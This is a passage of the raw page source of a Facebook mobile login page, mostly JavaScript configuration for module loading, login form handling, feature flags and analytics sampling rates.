                }, 32], ["MJSEnvironment", [], {
                    "IS_APPLE_WEBKIT_IOS": false,
                    "IS_TABLET": false,
                    "IS_ANDROID": false,
                    "IS_CHROME": true,
                    "IS_FIREFOX": false,
                    "IS_WINDOWS_PHONE": false,
                    "IS_SAMSUNG_DEVICE": false,
                    "OS_VERSION": 6.1,
                    "PIXEL_RATIO": 1,
                    "BROWSER_NAME": "Opera"
                }, 46], ["UserAgentData", [], {
                    "browserArchitecture": "64",
                    "browserFullVersion": "67.0.3575.105",
                    "browserMinorVersion": 0,
                    "browserName": "Opera",
                    "browserVersion": 67,
                    "deviceName": "Unknown",
                    "engineName": "WebKit",
                    "engineVersion": "537.36",
                    "platformArchitecture": "64",
                    "platformName": "Windows",
                    "platformVersion": "7",
                    "platformFullVersion": "7"
                }, 527], ["FbtLogger", [], {
                    "logger": null
                }, 288], ["FbtResultGK", [], {
                    "shouldReturnFbtResult": true,
                    "inlineMode": "NO_INLINE"
                }, 876], ["FbtQTOverrides", [], {
                    "overrides": {}
                }, 551], ["IntlHoldoutGK", [], {
                    "inIntlHoldout": false
                }, 2827], ["IntlNumberTypeConfig", [], {
                    "impl": "return IntlVariations.NUMBER_OTHER;"
                }, 3405], ["IntlViewerContext", [], {
                    "GENDER": 3
                }, 772], ["NumberFormatConfig", [], {
                    "decimalSeparator": ",",
                    "numberDelimiter": ".",
                    "minDigitsForThousandsSeparator": 4,
                    "standardDecimalPatternInfo": {
                        "primaryGroupSize": 3,
                        "secondaryGroupSize": 3
                    },
                    "numberingSystemData": null
                }, 54], ["IntlPhonologicalRules", [], {
                    "meta": {},
                    "patterns": {}
                }, 1496], ["ZeroRewriteRules", [], {
                    "rewrite_rules": {},
                    "whitelist": {
                        "\/hr\/r": 1,
                        "\/hr\/p": 1,
                        "\/zero\/unsupported_browser\/": 1,
                        "\/zero\/policy\/optin": 1,
                        "\/zero\/optin\/write\/": 1,
                        "\/zero\/optin\/legal\/": 1,
                        "\/zero\/optin\/free\/": 1,
                        "\/about\/privacy\/": 1,
                        "\/about\/privacy\/update\/": 1,
                        "\/about\/privacy\/update": 1,
                        "\/zero\/toggle\/welcome\/": 1,
                        "\/zero\/toggle\/nux\/": 1,
                        "\/fup\/interstitial\/": 1,
                        "\/work\/landing": 1,
                        "\/work\/login\/": 1,
                        "\/work\/email\/": 1,
                        "\/ai.php": 1,
                        "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                        "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
                        "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
                        "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
                        "\/qp\/interstitial\/": 1,
                        "\/qp\/action\/redirect\/": 1,
                        "\/qp\/action\/close\/": 1,
                        "\/zero\/support\/ineligible\/": 1,
                        "\/zero_balance_redirect\/": 1,
                        "\/zero_balance_redirect": 1,
                        "\/zero_balance_redirect\/l\/": 1,
                        "\/l.php": 1,
                        "\/lsr.php": 1,
                        "\/ajax\/dtsg\/": 1,
                        "\/checkpoint\/block\/": 1,
                        "\/exitdsite": 1,
                        "\/zero\/balance\/pixel\/": 1,
                        "\/zero\/balance\/": 1,
                        "\/zero\/balance\/carrier_landing\/": 1,
                        "\/zero\/flex\/logging\/": 1,
                        "\/tr": 1,
                        "\/tr\/": 1,
                        "\/sem_campaigns\/sem_pixel_test\/": 1,
                        "\/bookmarks\/flyout\/body\/": 1,
                        "\/zero\/subno\/": 1,
                        "\/confirmemail.php": 1,
                        "\/policies\/": 1,
                        "\/mobile\/internetdotorg\/classifier\/": 1,
                        "\/zero\/dogfooding": 1,
                        "\/xti.php": 1,
                        "\/zero\/fblite\/config\/": 1,
                        "\/hr\/zsh\/wc\/": 1,
                        "\/ajax\/bootloader-endpoint\/": 1,
                        "\/4oh4.php": 1,
                        "\/autologin.php": 1,
                        "\/birthday_help.php": 1,
                        "\/checkpoint\/": 1,
                        "\/contact-importer\/": 1,
                        "\/cr.php": 1,
                        "\/legal\/terms\/": 1,
                        "\/login.php": 1,
                        "\/login\/": 1,
                        "\/mobile\/account\/": 1,
                        "\/n\/": 1,
                        "\/remote_test_device\/": 1,
                        "\/upsell\/buy\/": 1,
                        "\/upsell\/buyconfirm\/": 1,
                        "\/upsell\/buyresult\/": 1,
                        "\/upsell\/promos\/": 1,
                        "\/upsell\/continue\/": 1,
                        "\/upsell\/h\/promos\/": 1,
                        "\/upsell\/loan\/learnmore\/": 1,
                        "\/upsell\/purchase\/": 1,
                        "\/upsell\/promos\/upgrade\/": 1,
                        "\/upsell\/buy_redirect\/": 1,
                        "\/upsell\/loan\/buyconfirm\/": 1,
                        "\/upsell\/loan\/buy\/": 1,
                        "\/upsell\/sms\/": 1,
                        "\/wap\/a\/channel\/reconnect.php": 1,
                        "\/wap\/a\/nux\/wizard\/nav.php": 1,
                        "\/wap\/appreg.php": 1,
                        "\/wap\/birthday_help.php": 1,
                        "\/wap\/c.php": 1,
                        "\/wap\/confirmemail.php": 1,
                        "\/wap\/cr.php": 1,
                        "\/wap\/login.php": 1,
                        "\/wap\/r.php": 1,
                        "\/zero\/datapolicy": 1,
                        "\/a\/timezone.php": 1,
                        "\/a\/bz": 1,
                        "\/bz\/reliability": 1,
                        "\/r.php": 1,
                        "\/mr\/": 1,
                        "\/reg\/": 1,
                        "\/registration\/log\/": 1,
                        "\/terms\/": 1,
                        "\/f123\/": 1,
                        "\/expert\/": 1,
                        "\/experts\/": 1,
                        "\/terms\/index.php": 1,
                        "\/terms.php": 1,
                        "\/srr\/": 1,
                        "\/msite\/redirect\/": 1,
                        "\/fbs\/pixel\/": 1,
                        "\/contactpoint\/preconfirmation\/": 1,
                        "\/contactpoint\/cliff\/": 1,
                        "\/contactpoint\/confirm\/submit\/": 1,
                        "\/contactpoint\/confirmed\/": 1,
                        "\/contactpoint\/login\/": 1,
                        "\/preconfirmation\/contactpoint_change\/": 1,
                        "\/help\/contact\/": 1,
                        "\/survey\/": 1,
                        "\/upsell\/loyaltytopup\/accept\/": 1,
                        "\/settings\/": 1,
                        "\/lite\/": 1
                    }
                }, 1478], ["ZeroCategoryHeader", [], {}, 1127], ["cr:692209", ["cancelIdleCallbackBlue"], {
                    "__rc": ["cancelIdleCallbackBlue", "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                }, -1]]);
                new (require("ServerJS"))().handle({
                    "require": [["MPrelude"], ["BanzaiODS"], ["VisualCompletionGating"], ["BanzaiScuba"], ["Bootloader", "markComponentsAsImmediate", [], [["BanzaiODS", "VisualCompletionGating", "BanzaiScuba"]]]]
                });
            }, "ServerJS define", {
                "root": true
            })();
        </script>
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/r/E3YMn8tEZI7.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous"/>
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iwrE4/yj/l/vi_VN/CwpzF2fcHdg.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous"/>
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/fU8lOVU2ZJ7.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous"/>
        <script>
            var bigPipe = new (require("BigPipe"))({
                "forceFinish": true,
                "config": {
                    "flush_pagelets_asap": true,
                    "dispatch_pagelet_replayable_actions": false
                }
            });
        </script>
        <script>
            bigPipe.beforePageletArrive("first_response")
        </script>
        <script>
            require("TimeSlice").guard((function() {
                bigPipe.onPageletArrive({
                    bootloadable: {
                        BanzaiODS: {
                            r: ["yRNCI", "zgN4d"],
                            rds: {
                                m: ["BanzaiODS", "BanzaiScuba"]
                            },
                            be: 1
                        },
                        VisualCompletionGating: {
                            r: ["2vYSp"]
                        },
                        BanzaiScuba: {
                            r: ["yRNCI", "zgN4d"],
                            rds: {
                                m: ["BanzaiODS", "BanzaiScuba"]
                            }
                        },
                        QPLInspector: {
                            r: ["VvVFw"],
                            be: 1
                        },
                        MPageControllerImpl: {
                            r: ["zgN4d", "yRNCI", "2vYSp", "BYBRF"],
                            rds: {
                                m: ["BanzaiODS", "BanzaiScuba", "MPageFetcherImpl", "VisualCompletionGating"]
                            }
                        },
                        MPageFetcherImpl: {
                            r: ["yRNCI", "2vYSp", "zgN4d"],
                            rds: {
                                m: ["BanzaiODS", "VisualCompletionGating", "BanzaiScuba"]
                            }
                        },
                        Banzai: {
                            r: ["yRNCI", "zgN4d"],
                            rds: {
                                m: ["BanzaiODS", "BanzaiScuba"]
                            },
                            be: 1
                        },
                        BanzaiStream: {
                            r: ["yRNCI", "ZU1ro", "zgN4d"],
                            rds: {
                                m: ["BanzaiODS", "BanzaiScuba"]
                            },
                            be: 1
                        },
                        ResourceTimingBootloaderHelper: {
                            r: ["X1lbp", "zgN4d"],
                            rds: {
                                m: ["BanzaiODS", "BanzaiScuba"],
                                r: ["yRNCI"]
                            },
                            be: 1
                        },
                        TimeSliceHelper: {
                            r: ["oN7Oc"],
                            be: 1
                        },
                        SnappyCompressUtil: {
                            r: ["yRNCI"],
                            be: 1
                        },
                        PerfXSharedFields: {
                            r: ["rIIyA"],
                            be: 1
                        },
                        TimeSliceInteractionsLiteTypedLogger: {
                            r: ["yRNCI", "FHtgt", "zgN4d"],
                            rds: {
                                m: ["BanzaiODS", "BanzaiScuba"]
                            },
                            be: 1
                        },
                        WebSpeedInteractionsTypedLogger: {
                            r: ["yRNCI", "4LL/S", "zgN4d"],
                            rds: {
                                m: ["BanzaiODS", "BanzaiScuba"]
                            },
                            be: 1
                        }
                    },
                    resource_map: {
                        VvVFw: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/AADBnDBsGZB.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        Ksyvg: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y6/r/E3YMn8tEZI7.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "n4L+p": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/eWF3RPi8AD_.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        kP52c: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3iUIV4/yu/l/vi_VN/svUTkzT1IT_.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "93rXf": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3iC9q4/yy/l/vi_VN/JJINaGOV-by.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        rIIyA: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3iwrE4/yj/l/vi_VN/CwpzF2fcHdg.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        X1lbp: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/fU8lOVU2ZJ7.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        ZU1ro: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/ayLW0OW8PB8.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        oN7Oc: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/LKSeeX_03cT.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        FHtgt: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/Y-rqdBCdEDd.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "4LL/S": {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y1/r/HxnxWPpnqKi.js?_nc_x=Ij3Wp8lg5Kz"
                        }
                    },
                    bxData: {
                        "875231": {
                            uri: "https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico"
                        }
                    },
                    gkxData: {
                        "712819": {
                            result: false,
                            hash: "AT4nFRw_WoTMYv80"
                        },
                        "676781": {
                            result: false,
                            hash: "AT7FrAic04Q7-Db9"
                        },
                        "910664": {
                            result: false,
                            hash: "AT54Ml5lm6-jIHG9"
                        },
                        "1070739": {
                            result: false,
                            hash: "AT7AV69IHyX7T7OA"
                        },
                        "820050": {
                            result: true,
                            hash: "AT5e0MZ0DOUxFga1"
                        },
                        "985697": {
                            result: false,
                            hash: "AT7SpRhJWBZxIsLN"
                        },
                        "676812": {
                            result: false,
                            hash: "AT62B1VOnrY_pxZt"
                        },
                        "676811": {
                            result: false,
                            hash: "AT7xMGLEzOmsrNNR"
                        },
                        "726410": {
                            result: true,
                            hash: "AT6jkpNK0Fq7HTp_"
                        },
                        "708253": {
                            result: false,
                            hash: "AT6_G6hR1IwE80zb"
                        },
                        "692841": {
                            result: false,
                            hash: "AT5GD9rDgktv-v37"
                        },
                        "1099893": {
                            result: false,
                            hash: "AT6WsMg7zRUUOpdC"
                        },
                        "862436": {
                            result: false,
                            hash: "AT5TzFL1_n-_l3sk"
                        }
                    },
                    qexData: {
                        "1281955": {
                            r: null
                        },
                        "833102": {
                            r: null
                        }
                    },
                    allResources: ["BYBRF", "yRNCI", "zgN4d", "Ksyvg", "n4L+p", "kP52c", "2vYSp", "S0evd", "93rXf", "rIIyA", "X1lbp"],
                    displayResources: ["BYBRF", "yRNCI", "zgN4d", "Ksyvg", "2vYSp", "S0evd", "rIIyA", "X1lbp"],
                    id: "first_response",
                    phase: 0,
                    jsmods: {
                        elements: [["__elem_de5177dd_0_0", "u_0_0", 1], ["__elem_921b58ef_0_0", "login_form", 2], ["__elem_e24cb174_0_0", "m_login_password", 1], ["__elem_7216e2ae_0_2", "u_0_1", 1], ["__elem_e03291d5_0_1", "u_0_2", 1], ["__elem_e03291d5_0_0", "u_0_3", 1], ["__elem_7216e2ae_0_0", "u_0_4", 1], ["__elem_7216e2ae_0_1", "signup_button_area", 1], ["__elem_e980dec4_0_0", "signup-button", 1], ["__elem_8a020238_0_0", "forgot-password-link", 1], ["__elem_49f6b607_0_0", "root", 1], ["__elem_eed16c0a_0_0", "u_0_5", 1], ["__elem_a588f507_0_0", "u_0_6", 1], ["__elem_a588f507_0_1", "u_0_7", 1], ["__elem_0cdc66ad_0_0", "u_0_9", 1], ["__elem_0cdc66ad_0_1", "u_0_a", 1]],
                        require: [["MLoginController", "initAccountRecoveryFunnelLogging", ["__elem_8a020238_0_0"], [{
                            __m: "__elem_8a020238_0_0"
                        }, "click_forget_password", "8RGLXqqnUo4wycrA7ZUE2aif"]], ["BrowserPrefillLogging", "initContactpointFieldLogging", [], [{
                            contactpointFieldID: "m_login_email",
                            serverPrefill: ""
                        }]], ["BrowserPrefillLogging", "initPasswordFieldLogging", [], [{
                            passwordFieldID: "m_login_password"
                        }]], ["PlatformDialogCBTSetter", "setCBTInFormAndLog", ["__elem_921b58ef_0_0"], [{
                            __m: "__elem_921b58ef_0_0"
                        }, "client_logged_out_init_impression"]], ["MLoginView", "disableOnSubmit", ["__elem_921b58ef_0_0", "__elem_7216e2ae_0_0"], [{
                            __m: "__elem_921b58ef_0_0"
                        }, {
                            __m: "__elem_7216e2ae_0_0"
                        }]], ["MLoginController", "initRegButton", ["__elem_7216e2ae_0_1"], [{
                            root: {
                                __m: "__elem_7216e2ae_0_1"
                            },
                            regURI: "/reg-no-deeplink/?cid=103",
                            useRegToLogin: true
                        }]], ["MLoginController", "initLoginForm", ["__elem_de5177dd_0_0"], [{
                            root: {
                                __m: "__elem_de5177dd_0_0"
                            },
                            ajaxURI: "/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100",
                            clearOnDelete: false,
                            listenKeyDown: false,
                            isTwoStepsLogin: false,
                            isActionLoggingEnabled: true,
                            isCredsManagerEnabled: false,
                            isCredsSavingEnabled: true,
                            isPasswordlessEnabled: false,
                            doNotShowUserHeader: false,
                            shouldWaitForPasswordSave: false,
                            onErrorRegURI: "/r.php",
                            shouldAutoLandOnStep2: false,
                            shouldPrefillJioHeaderForRegFromLogin: false,
                            shouldProcessUserConsentForTokenHeader: false,
                            shouldProcessUserConsentForHeader: false,
                            shouldShowSmartLockSelector: false,
                            shouldRunBotDetection: false,
                            clearPrefillMaskOnKeydown: false,
                            datrCookie: "8RGLXqqnUo4wycrA7ZUE2aif",
                            pubKeyData: {
                                publicKey: "3f05b369c11b3c28afe120ac9d5c5f5da4fb3086967afccaa695dfa48802c52a",
                                keyId: 2
                            }
                        }]], ["MPasswordPlainTextToggle", "init", ["__elem_e24cb174_0_0", "__elem_7216e2ae_0_2", "__elem_e03291d5_0_0", "__elem_e03291d5_0_1"], [{
                            __m: "__elem_e24cb174_0_0"
                        }, {
                            __m: "__elem_7216e2ae_0_2"
                        }, {
                            __m: "__elem_e03291d5_0_0"
                        }, {
                            __m: "__elem_e03291d5_0_1"
                        }]], ["ServiceWorkerLoginAndLogoutListener", "listen", [], ["login_button_block", "login", "/sw?s=push", null]], ["MTouchable"], ["MBlockingTouchable", "init", ["__elem_e980dec4_0_0"], [{
                            __m: "__elem_e980dec4_0_0"
                        }]], ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_49f6b607_0_0"], [[{
                            __m: "__elem_49f6b607_0_0"
                        }]]], ["MScrollPositionSaver"], ["MLogoutClearCache"], ["LoadingIndicator", "init", ["__elem_eed16c0a_0_0", "__elem_a588f507_0_0", "__elem_a588f507_0_1"], [{
                            __m: "__elem_eed16c0a_0_0"
                        }, {
                            __m: "__elem_a588f507_0_0"
                        }, {
                            __m: "__elem_a588f507_0_1"
                        }]], ["MPageError"], ["MPageHeaderAccessibility"], ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_0"], [{
                            __m: "__elem_0cdc66ad_0_0"
                        }]], ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_1"], [{
                            __m: "__elem_0cdc66ad_0_1"
                        }]], ["MLoadingIndicator", "init", [], ["u_0_8"]], ["LogHistoryListeners"], ["ScriptPath", "set", [], ["/wap/index.php", "0f4ef985", {
                            imp_id: "03B81znydjLDSkQvb",
                            ef_page: null
                        }]], ["MCommentViewportTracking", "singleton", [], [{
                            enabled: true,
                            debug_console: false,
                            debug_html: false,
                            idle_timeout: 5000,
                            min_duration_to_log: 100,
                            min_visible_size: 200
                        }]], ["MLogging", "main", [], [{
                            refid: 8
                        }]], ["RemoteDevice", "init", [], [{
                            performHardwareDetection: false,
                            hashId: null
                        }]], ["Artillery"], ["MLinkHack"], ["MModalDialogInit"], ["MVerifyCache", "main", [], [{
                            viewer: 0
                        }]], ["EventProfiler"], ["MPageNavigationTracking", "init", [], []], ["ScriptPathLogger", "startLogging", [], []], ["MTimeSpentBitArrayLogger", "init", [], ["m", false]], ["MCoreDeferred"], ["MPageControllerImpl"], ["MPageFetcherImpl"], ["Bootloader", "markComponentsAsImmediate", [], [["BanzaiODS", "BanzaiScuba", "MPageControllerImpl", "VisualCompletionGating", "MPageFetcherImpl"]]]],
                        pre_display_requires: [["AddressBar", "setupLoadListener", [], [], 4], ["MobileBigPipeStratcomProxy", "init", [], [], 4], ["Stratcom", "init", [], [], 4], ["MViewport", "init", [], [], 4], ["MPageController", "init", [], [], 4], ["MResponseActionsProxy", "init", [], [], 4], ["onSyncTTI", "run", [], [], 4], ["MLiteInit", "init", [], [], 4]],
                        define: [["MLoadingIndicatorSigils", [], {
                            ANIMATE: "m-loading-indicator-animate",
                            ROOT: "m-loading-indicator-root"
                        }, 279], ["MobileAppDetect", [], {
                            is_mobile_app: false,
                            is_ads_manager_app: false,
                            is_pages_manager: false,
                            is_facebook_for_android: false,
                            is_facebook_for_android_in_app_browser: false,
                            is_facebook_for_ios: false,
                            is_instagram: false,
                            is_messenger_for_android: false,
                            is_messenger_for_ios: false,
                            is_wilde: false,
                            is_kaios: false
                        }, 1109], ["MWebStorageMonsterWhiteList", [], {
                            whitelist: ["^Banzai$", "^bz", "^banzai\\:last_storage_flush$", "^mutex", "^msys", "^sp_pi$", "^\\:userchooser\\:osessusers$", "^\\:userchooser\\:settings$", "^[0-9]+:powereditor:", "^Bandicoot\\:", "^brands\\:console\\:config$", "^CacheStorageVersion$", "^consoleEnabled$", "^_video_$", "^vc_", "^_showMDevConsole$", "^_ctv_", "^ga_client_id$", "^qe_switcher_nub_selection$", "^_mswam_$", "^am_recently_used_filters\\:", "^ickt$", "^imp_seq_num$"]
                        }, 254], ["FWLoader", [], {}, 278], ["ImmediateActiveSecondsConfig", [], {
                            sampling_rate: 0
                        }, 423], ["FalcoJSLoggerSamplingPolicies", [], {
                            rates: {
                                accountquality_aqaction_augl: 1,
                                accountquality_aqlink_augl: 1,
                                accountquality_aqpagerender_augl: 1,
                                accountquality_aqviewpanetab_augl: 1,
                                accountquality_aqviewpanetabended_augl: 1,
                                accountquality_coreappexperience_augl: 1,
                                accountquality_coreappexperienceended_augl: 1,
                                accountquality_coreinteractionbutton_augl: 1,
                                accountquality_coreinteractioncheckbox_augl: 1,
                                accountquality_coreinteractioncollapse_augl: 1,
                                accountquality_coreinteractiondropdown_augl: 1,
                                accountquality_coreinteractiondropdownended_augl: 1,
                                accountquality_coreinteractionexpand_augl: 1,
                                accountquality_coreinteractionmouseover_augl: 1,
                                accountquality_coreinteractionmouseoverended_augl: 1,
                                accountquality_coreinteractionpanetab_augl: 1,
                                accountquality_coreuserinteraction_augl: 1,
                                accountquality_coreuserinteractionended_augl: 1,
                                admin_edit_session: 10000,
                                admin_saw_hcp_ed_interstitial: 1,
                                adsadbuilder_amadbuildercomponentrenderended_augl: 1,
                                adsadbuilder_amadbuildercomponentrenderstarted_augl: 1,
                                adsadbuilder_amadbuildercreationpageopened_augl: 1,
                                adsadbuilder_amadbuilderdraftdeleted_augl: 1,
                                adsadbuilder_amadbuildermockupdeletion_augl: 1,
                                adsadbuilder_amadbuildermockupreadystatuschanged_augl: 1,
                                adsadbuilder_amadbuildernavigatedtoanotherpage_augl: 1,
                                adsadbuilder_amadbuilderoptinstarted_augl: 1,
                                adsadbuilder_amadbuilderoptoutstarted_augl: 1,
                                adsadbuilder_coreappexperience_augl: 1,
                                adsadbuilder_coreuserinteraction_augl: 1,
                                adsadpreview_amadpreviewassetupdated_augl: 1,
                                adsadpreview_amadpreviewerror_augl: 1,
                                adsadpreview_amadpreviewfinish_augl: 1,
                                adsadpreview_amadpreviewinitialrender_augl: 1,
                                adsadpreview_amadpreviewpageletfinish_augl: 1,
                                adsadpreview_amadpreviewpageletstart_augl: 1,
                                adsadpreview_amadpreviewresponsecancel_augl: 1,
                                adsadpreview_amadpreviewresponseerror_augl: 1,
                                adsadpreview_amadpreviewresponsesuccess_augl: 1,
                                adsadpreview_amadpreviewstart_augl: 1,
                                adsadpreview_coreappexperience_augl: 1,
                                adsadpreview_coreappexperienceended_augl: 1,
                                adsadpreview_coreuserinteraction_augl: 1,
                                adsadpreview_coreuserinteractionended_augl: 1,
                                adscometflytrap_afcometselectadscategory_augl: 1,
                                adscometflytrap_afcometselectproduct_augl: 1,
                                adscometflytrap_coreappexperience_augl: 1,
                                adscometflytrap_coreappexperienceended_augl: 1,
                                adscometflytrap_coreinteractionbutton_augl: 1,
                                adscometflytrap_coreinteractiontextinput_augl: 1,
                                adscometflytrap_coreinteractiontextinputended_augl: 1,
                                adscometflytrap_coreuserinteraction_augl: 1,
                                adscometflytrap_coreuserinteractionended_augl: 1,
                                adsflytrap_afsendfeedback_augl: 1,
                                adsflytrap_coreappexperience_augl: 1,
                                adsflytrap_coreappexperienceended_augl: 1,
                                adsflytrap_coreinteractionbutton_augl: 1,
                                adsflytrap_coreinteractiondropdown_augl: 1,
                                adsflytrap_coreinteractiondropdownended_augl: 1,
                                adsflytrap_coreinteractiontextinput_augl: 1,
                                adsflytrap_coreinteractiontextinputended_augl: 1,
                                adsflytrap_coreuserinteraction_augl: 1,
                                adsflytrap_coreuserinteractionended_augl: 1,
                                adsflytrap_coreviewmodal_augl: 1,
                                adsflytrap_coreviewmodalended_augl: 1,
                                adsmanager_amaccountoverview_augl: 1,
                                adsmanager_amaccountoverviewended_augl: 1,
                                adsmanager_amadbuilderimportflowmockupconfirmed_augl: 1,
                                adsmanager_amadbuilderimportflowmockupselected_augl: 1,
                                adsmanager_amadbuilderimportflowstarted_augl: 1,
                                adsmanager_amadobjectcreateflow_augl: 1,
                                adsmanager_amadobjectcreateflowended_augl: 1,
                                adsmanager_amadobjectduplicateflow_augl: 1,
                                adsmanager_amadobjectduplicateflowended_augl: 1,
                                adsmanager_amadobjecteditflow_augl: 1,
                                adsmanager_amadobjecteditflowended_augl: 1,
                                adsmanager_amadobjectexportflow_augl: 1,
                                adsmanager_amadobjectexportflowended_augl: 1,
                                adsmanager_amadobjectimportflow_augl: 1,
                                adsmanager_amadobjectimportflowended_augl: 1,
                                adsmanager_amadobjectreviewandpublishflow_augl: 1,
                                adsmanager_amadobjectreviewandpublishflowended_augl: 1,
                                adsmanager_amadobjectsetbuyingtype_augl: 1,
                                adsmanager_amadobjectsetobjective_augl: 1,
                                adsmanager_amadscopyerror_augl: 1,
                                adsmanager_amapierror_augl: 1,
                                adsmanager_amautonamingclicktosave_augl: 1,
                                adsmanager_ambackgrounderaserdialogclose_augl: 1,
                                adsmanager_amblockingvalidationerror_augl: 1,
                                adsmanager_amconvergencecontextualmenuclick_augl: 1,
                                adsmanager_amconvergenceexternalcreationdialogclick_augl: 1,
                                adsmanager_amconvergencefocusmode_augl: 1,
                                adsmanager_amconvergencefocusmodeended_augl: 1,
                                adsmanager_amconvergencefocusmodetoggleclick_augl: 1,
                                adsmanager_amconvergenceoptinoptout_augl: 1,
                                adsmanager_amconvergencepublishflow_augl: 1,
                                adsmanager_amconvergencepublishflowended_augl: 1,
                                adsmanager_amconvergencepublishpreviewdialogselection_augl: 1,
                                adsmanager_amcrash_augl: 1,
                                adsmanager_amcreateflow_augl: 1,
                                adsmanager_amcreateflowended_augl: 1,
                                adsmanager_amcreateflowfocusframework_augl: 1,
                                adsmanager_amcreateflowfocusframeworkclicktoedit_augl: 1,
                                adsmanager_amcreateflowfocusframeworkended_augl: 1,
                                adsmanager_amcreateflowmutableoption_augl: 1,
                                adsmanager_amcreateflowpage_augl: 1,
                                adsmanager_amcreateflowpageended_augl: 1,
                                adsmanager_amcriticalexception_augl: 1,
                                adsmanager_amdraftfragmentloaderror_augl: 1,
                                adsmanager_amdraftloaderror_augl: 1,
                                adsmanager_ameditflow_augl: 1,
                                adsmanager_ameditflowended_augl: 1,
                                adsmanager_amemojiclicktoedit_augl: 1,
                                adsmanager_amemojiselectedemoji_augl: 1,
                                adsmanager_amexception_augl: 1,
                                adsmanager_amfatalerror_augl: 1,
                                adsmanager_amhomeview_augl: 1,
                                adsmanager_amhomeviewended_augl: 1,
                                adsmanager_amimporterror_augl: 1,
                                adsmanager_aminit_augl: 1,
                                adsmanager_aminstantcheckoutdropdown_augl: 1,
                                adsmanager_aminstantcheckoutsection_augl: 1,
                                adsmanager_aminstantcheckoutsectionended_augl: 1,
                                adsmanager_amnamingtypeaheadselect_augl: 1,
                                adsmanager_ampublisherror_augl: 1,
                                adsmanager_amsmartbackgrounddialog_augl: 1,
                                adsmanager_amsmartbackgrounddialogclosed_augl: 1,
                                adsmanager_amsmartbackgrounderror_augl: 1,
                                adsmanager_amsmartbackgroundimagesave_augl: 1,
                                adsmanager_amtableadobject_augl: 1,
                                adsmanager_amtableadobjectended_augl: 1,
                                adsmanager_amurltypeahead_augl: 1,
                                adsmanager_amvalidationerror_augl: 1,
                                adsmanager_coreappexperience_augl: 1,
                                adsmanager_coreappexperienceended_augl: 1,
                                adsmanager_coreinteractiontoggle_augl: 1,
                                adsmanager_coreuserinteraction_augl: 1,
                                adsmanager_coreuserinteractionended_augl: 1,
                                adswaittimespinners_awtspinners_augl: 1,
                                adswaittimespinners_coreappexperience_augl: 1,
                                adswaittimespinners_coreappexperienceended_augl: 1,
                                adswaittimespinners_coreuserinteraction_augl: 1,
                                adswaittimespinners_coreuserinteractionended_augl: 1,
                                al_dialog_shown: 1,
                                altpay2_ui_event: 1,
                                auglexplorer_augleupdatefilter_augl: 1,
                                auglexplorer_coreappexperience_augl: 1,
                                auglexplorer_coreappexperienceended_augl: 1,
                                auglexplorer_coreuserinteraction_augl: 1,
                                auglexplorer_coreuserinteractionended_augl: 1,
                                bd_mobile_signals: 1,
                                bd_pdc_signals: 1,
                                billing1_workplace_event: 1,
                                billing_interface_debug: 1,
                                billing_interface_error: 1,
                                billing_interface_event: 1,
                                billing_interface_surface_debug: 1,
                                billing_interface_surface_error: 1,
                                billing_interface_surface_event: 1,
                                biz_core_log_out_click: 1,
                                biz_core_more_tools_item_click: 1,
                                biz_core_more_tools_item_impression: 1,
                                biz_core_nav_bar_hover: 1,
                                biz_core_notification_item_click: 1,
                                biz_core_notification_item_impression: 1,
                                biz_core_notifications_impression: 1,
                                biz_core_overlay_item_enter_flow: 1,
                                biz_core_overlay_item_exit_flow: 1,
                                biz_core_overlay_item_impression: 1,
                                biz_core_presence_switcher_click: 1,
                                biz_core_presence_switcher_enter_flow: 1,
                                biz_core_presence_switcher_exit_flow: 1,
                                biz_core_presence_switcher_render_view: 1,
                                biz_core_presence_switcher_update_value: 1,
                                biz_core_tab_item_click: 1,
                                biz_core_tab_item_enter_flow: 1,
                                biz_core_tab_item_exit_flow: 1,
                                biz_core_tab_item_impression: 1,
                                biz_core_tool_outcome: 1,
                                biz_home_tab_ads_card_click: 1,
                                biz_home_tab_ads_card_impression: 1,
                                biz_home_tab_alerts_card_click: 1,
                                biz_home_tab_alerts_card_dismiss: 1,
